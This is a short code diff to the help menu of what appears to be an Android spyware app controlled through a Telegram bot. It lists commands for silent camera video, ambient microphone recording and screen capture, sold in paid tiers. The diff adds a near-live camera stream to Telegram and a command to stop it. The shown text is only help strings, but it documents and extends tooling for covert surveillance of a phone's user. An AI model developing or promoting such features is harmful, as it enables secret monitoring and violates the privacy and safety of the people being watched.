@@ -42,6 +42,8 @@ class HelpCommand @Inject constructor() : Command {
             • <code>/screen_burst [5-10]</code> — Rapid 5–10 frame montage [PRO TRIAL]
             • <code>/screenrecord &lt;seconds&gt;</code> — MP4 screen recording [PRO]
             • <code>/video front|back &lt;seconds&gt;</code> — Silent camera video (1-60s) [PRO TRIAL]
+            • <code>/livestream [front|back] [mins]</code> — Near-live sequential video stream to Telegram [PRO]
+            • <code>/stopstream</code> — Stop active live video stream
             • <code>/record &lt;seconds&gt;</code> — Ambient microphone recording [PRO TRIAL]
             • <code>/record stop</code> — Stop recording
 
